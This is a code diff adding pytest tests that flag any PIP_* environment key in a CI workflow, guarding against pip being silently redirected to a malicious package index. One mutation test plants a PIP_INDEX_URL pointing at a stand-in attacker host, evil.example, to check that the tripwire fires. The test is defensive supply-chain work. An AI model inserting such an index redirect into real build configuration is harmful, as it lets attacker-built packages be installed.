@@ -1485,6 +1485,109 @@ class TestDependencyDriftIsDetectable:
         with pytest.raises(AssertionError, match="does not apply constraints"):
             self.test_cursor_install_sh_matches_the_ci_install_line()
 
+    def _pip_environment_keys(self, workflow_text):
+        """`env:` keys configuring pip, from job- and step-level blocks.
+
+        A PIP_* key is a pip configuration channel that operates
+        INDEPENDENTLY of the install line this class reads. The `env:`
+        line is anchored to end-of-line so `environment:` never matches;
+        keys are compared case-insensitively (over-catch: pip itself
+        reads only uppercase, but a lowercase `pip_*` key reads as
+        intended-for-pip to every future reader even if pip ignores it).
+        """
+        offenders = []
+        env_indent = None
+        for raw in workflow_text.splitlines():
+            stripped = raw.strip()
+            if not stripped or stripped.startswith("#"):
+                continue
+            indent = len(raw) - len(raw.lstrip(" "))
+            if env_indent is not None:
+                if indent > env_indent:
+                    key = stripped.split(":", 1)[0].strip()
+                    if key.upper().startswith("PIP_"):
+                        offenders.append(key)
+                    continue
+                env_indent = None
+            if re.match(r"^\s*-?\s*env:\s*$", raw):
+                env_indent = indent
+        return offenders
+
+    def test_no_pip_environment_key_redirects_the_install(self):
+        """No `env:` key may start with PIP_ — it redirects pip unseen.
+
+        PIP_INDEX_URL redirects every resolve to an index of someone
+        else's choosing, PIP_CONSTRAINT re-points the constraint file,
+        and the constraints file's `==` pins carry no hashes — so a
+        redirected index can serve attacker builds of the pinned
+        versions. Round-6 probe (S6-3): such a key rode every arm in
+        this class green, because environment configuration touches
+        none of the surfaces they read. The workflow carries NO env:
+        block today, so this arm is a TRIPWIRE, deliberately
+        over-catch-only: any PIP_* key reddens naming itself whether or
+        not the use looks legitimate — a future key with a real purpose
+        is reconciled by justifying it HERE and naming it in this
+        docstring, never by deleting the arm.
+        """
+        root = self._source_repo_root()
+        if root is None:
+            pytest.skip(
+                "SKIPPED, NOT PASSED — no .claude-plugin/marketplace.json "
+                f"above {Path(__file__).resolve()}, so this is not a PACT "
+                "source checkout. The expected case is an INSTALLED PLUGIN "
+                "CACHE, which has no .github/ tree by design. This skip "
+                "is NO INFORMATION about PIP_* environment keys — never "
+                "read it as a pass."
+            )
+        workflow = root / ".github" / "workflows" / "tests.yml"
+        assert workflow.exists(), (
+            f"source checkout detected at {root} (marketplace.json present) "
+            f"but {workflow} is missing. The env tripwire cannot run. "
+            f"This is a FAILURE, not a skip: inside a checkout the "
+            f"workflow is required."
+        )
+        offenders = self._pip_environment_keys(
+            workflow.read_text(encoding="utf-8"))
+        assert not offenders, (
+            f"PIP ENVIRONMENT DRIFT: env: key(s) {offenders} in "
+            f"{workflow} configure pip through the environment, OUTSIDE "
+            f"every install-line arm — PIP_INDEX_URL redirects resolves "
+            f"to an index the constraints file never vetted, and the "
+            f"pins carry no hashes, so the redirect serves builds of the "
+            f"pinned versions. A PIP_* key needs a recorded decision in "
+            f"test_no_pip_environment_key_redirects_the_install, not a "
+            f"silent env: line."
+        )
+
+    def test_a_pip_env_key_reddens_naming_itself(self, tmp_path, monkeypatch):
+        """MUTATION ARM (env): a PIP_INDEX_URL step key reddens by name.
+
+        Planted exactly where it would ride silently pre-fix — a step
+        env: block on the install step — and killed by the shipped
+        tripwire, with the key's own name in the message.
+        """
+        root = self._source_repo_root()
+        if root is None:
+            pytest.skip("SKIPPED, NOT PASSED — not a source checkout; see "
+                        "_repo_copy_carrying for the full wording.")
+        workflow = root / ".github" / "workflows" / "tests.yml"
+        canonical = self._ci_install_line(workflow)
+        mutated = workflow.read_text(encoding="utf-8").replace(
+            canonical,
+            canonical + "\n        env:\n"
+                        "          PIP_INDEX_URL: https://evil.example/simple",
+            1,
+        )
+        copy = self._repo_copy_carrying(
+            tmp_path / "env", workflow_text=mutated)
+        monkeypatch.setattr(type(self), "_source_repo_root", lambda self: copy)
+        with pytest.raises(AssertionError, match="PIP ENVIRONMENT DRIFT") \
+                as exc_info:
+            self.test_no_pip_environment_key_redirects_the_install()
+        assert "PIP_INDEX_URL" in str(exc_info.value), (
+            f"the red must name the offending key; got: {exc_info.value}"
+        )
+
     def test_the_three_floor_literals_agree(self):
         """Declared floor, CI cell and AST guard must move together.
 
